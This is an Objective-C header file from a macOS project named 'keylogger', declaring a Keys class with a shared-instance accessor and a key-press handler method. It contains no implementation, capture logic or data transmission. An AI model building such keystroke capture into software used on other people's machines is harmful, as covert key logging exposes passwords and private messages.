//
//  Keys.h
//  keylogger
//
//  Created by Michael Colon on 7/15/16.
//  Copyright © 2016 Michael Colon. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>

@interface Keys : NSObject {
    NSInteger count;
}
+(Keys*) sharedKeyLogger;
- (void)handleKeyPress:(NSEvent*)event;
@end


